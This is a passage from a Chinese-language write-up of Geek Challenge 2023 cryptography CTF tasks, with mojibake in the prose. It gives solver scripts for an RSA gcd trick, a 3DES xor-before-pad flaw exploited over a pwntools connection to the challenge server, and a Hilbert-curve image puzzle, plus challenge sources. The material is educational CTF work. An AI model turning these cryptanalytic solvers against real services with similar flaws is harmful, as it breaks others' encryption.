n></span><br><span class="line"><span class="comment">#c= 375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line"><span class="comment">#n= 728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br></pre></td></tr></table></figure></blockquote><p>å‚è€ƒGKCTF 2021 - RRRRsaç›¸å…³æ¨å¯¼ï¼Œæ¶ˆå…ƒæ±‚gcdå¾— $p$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">e1= <span class="number">113717</span></span><br><span class="line">e2= <span class="number">80737</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1= <span class="number">97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></span><br><span class="line">c2= <span class="number">353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line">c= <span class="number">375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line">n= <span class="number">728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br><span class="line"></span><br><span class="line">x1 = <span class="built_in">pow</span>(c1 * <span class="built_in">pow</span>(<span class="number">3</span>, -e1, n),e2,n)</span><br><span class="line">x2 = <span class="built_in">pow</span>(c2 * <span class="built_in">pow</span>(<span class="number">7</span>, -e2, n),e1,n)</span><br><span class="line">p = gcd(x1-x2, n)</span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m= <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="Simple3DES"><a href="#Simple3DES" class="headerlink" title="Simple3DES"></a>Simple3DES</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:23333 <a href="https://blog.csdn.net/Mr_wzc/article/details/121713518">https://blog.csdn.net/Mr_wzc/article/details/121713518</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+<span class="built_in">chr</span>((padlen-(<span class="built_in">len</span>(msg)%padlen))).encode()*(padlen-(<span class="built_in">len</span>(msg)%padlen))</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">sec = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">msg,key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        msg = xor(long_to_bytes(msg),sec)</span><br><span class="line">        des = DES3.new(key,DES3.MODE_ECB)</span><br><span class="line">        ct = xor(des.encrypt(pad(msg,<span class="number">8</span>)),sec)</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(ct)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> Exception</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service</span>():</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Simple DES Encryption Service&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> cnt&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1. Encrypt\n2. Get encrypted flag.&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input msg:&#x27;</span>)</span><br><span class="line">            msg = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(msg,key))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(bytes_to_long(flag),key))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bye!&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    service()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure></blockquote><p>ä»£ç é—®é¢˜åœ¨å…ˆxoråpadï¼Œå¯¹äº <code>m=b&#39;\x00&#39;</code>ï¼Œæœ‰ <code>m^sec=sec</code>ï¼Œ<code>pad(sec,8)=sec+b&#39;\x08&#39;*8</code>ã€‚</p><p>ç¬¬ä¸€è½®ï¼š</p><p><code>pad(sec,8)=sec+b&#39;\x08&#39;*8</code>ï¼ŒåŠ å¯†å¾—åˆ° <code>c1^x | c2^x</code>ï¼Œåˆç”± <code>b&#39;\x08&#39;*8</code> å¯æ±‚å‡º <code>c2</code>ï¼Œå¾—åˆ° <code>x</code>ã€‚</p><p>ç¬¬äºŒè½®ï¼š</p><p>å·²çŸ¥ <code>c&#39;^x</code>ï¼Œè§£å¯†å¾—åˆ° <code>flag^x</code>ï¼Œå†å¼‚æˆ–å¾—åˆ° <code>flag</code>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">23333</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">key = bytes_to_long(<span class="string">b&#x27;abcdefgh&#x27;</span>+<span class="string">b&#x27;ijklmnop&#x27;</span>+<span class="string">b&#x27;qrstuvwx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;flag.\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;msg:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(m).encode())</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;key:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(key).encode())</span><br><span class="line"></span><br><span class="line">c_xor = long_to_bytes(<span class="built_in">eval</span>(r.recvline()))</span><br><span class="line">c1_xor,c2_xor = c_xor[:<span class="number">8</span>],c_xor[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">des = DES3.new(long_to_bytes(key),DES3.MODE_ECB)</span><br><span class="line"></span><br><span class="line">c2 = des.encrypt(<span class="string">b&#x27;\x08&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sec = xor(c2,c2_xor)</span><br><span class="line"><span class="built_in">print</span>(sec)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;flag.\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;key:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(key).encode())</span><br><span class="line"></span><br><span class="line">flag_c_xor = long_to_bytes(<span class="built_in">eval</span>(r.recvline()))</span><br><span class="line">flag_c = xor(flag_c_xor,sec)</span><br><span class="line">flag_xor = des.decrypt(flag_c)</span><br><span class="line">flag = xor(flag_xor,sec)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;DES_1s_0ut_0f_t1me&#125;o&#x27; </span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="JPGDiff"><a href="#JPGDiff" class="headerlink" title="JPGDiff"></a>JPGDiff</h3><blockquote><p>å›¾ç‰‡ä¸­çš„å­—ç¬¦ä¸²å³ä¸ºflag</p></blockquote><p>æç¤ºå›¾ç‰‡ä¸ºHilbertæ›²çº¿ï¼Œä¸”é•¿å›¾ä¸º1*65536çš„jpgå›¾ç‰‡ï¼Œç¬¦åˆ8é˜¶Hilbertæ›²çº¿çš„èŠ‚ç‚¹æ•°ã€‚</p><p>æŒ‰8é˜¶Hilbertæ›²çº¿çš„é¡ºåºæ¥å¸ƒç½®æ¯ä¸€ä¸ª1*1åƒç´ ï¼Œå³å¯è¿˜åŸåŸå§‹å›¾ç‰‡ã€‚</p><p>åˆ©ç”¨<a href="https://github.com/galtay/hilbertcurve">hilbertcurve</a>åŒ…å®Œæˆæ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image </span><br><span class="line">im_cp = Image.<span class="built_in">open</span>(<span class="string">&quot;ct.png&quot;</span>)</span><br><span class="line">im_new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">256</span>,<span class="number">256</span>)) </span><br><span class="line"></span><br><span class="line">p=<span class="number">8</span>; n=<span class="number">2</span></span><br><span class="line">hilbert_curve = HilbertCurve(p, n)</span><br><span class="line">distances = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65536</span>))</span><br><span class="line">points = hilbert_curve.points_from_distances(distances)</span><br><span class="line">order = []</span><br><span class="line"><span class="keyword">for</span> point, dist <span class="keyword">in</span> <span class="built_in">zip</span>(points, distances):</span><br><span class="line">    <span class="comment">#print(f&#x27;&#123;dist&#125; = &#123;tuple(point)&#125;&#x27;)</span></span><br><span class="line">    order.append(<span class="built_in">tuple</span>(point))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(order))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    tmp = im_cp.getpixel((<span class="number">0</span>,k))</span><br><span class="line">    im_new.putpixel(order[k],tmp)</span><br><span class="line">    </span><br><span class="line">im_new.save(<span class="string">&#x27;m.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å›¾ç‰‡ï¼š</p><p><img src="/2023/11/27/match-Geek-Challenge-2023/m-1701104909234-1.png" alt="m"></p><p>flagï¼š<code>SYC&#123;H1LB5RT_C1pher&#125;</code></p><p>â€‹    </p><h3 id="Energetic-Carcano"><a href="#Energetic-Carcano" class="headerlink" title="Energetic_Carcano"></a>Energetic_Carcano</h3><blockquote><p>é¢˜ç›®é“¾æ¥ï¼šnc 59.110.20.54:8763 <a href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography">https://en.wikipedia.org/wiki/Elliptic-curve_cryptography</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from sage.all import *</span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span> </span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">pbits = <span class="number">120</span></span><br><span class="line">abp = <span class="string">&quot;abp&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,p,turn,ans</span>):</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(a) == ans </span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b) == ans</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(p) == ans  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for 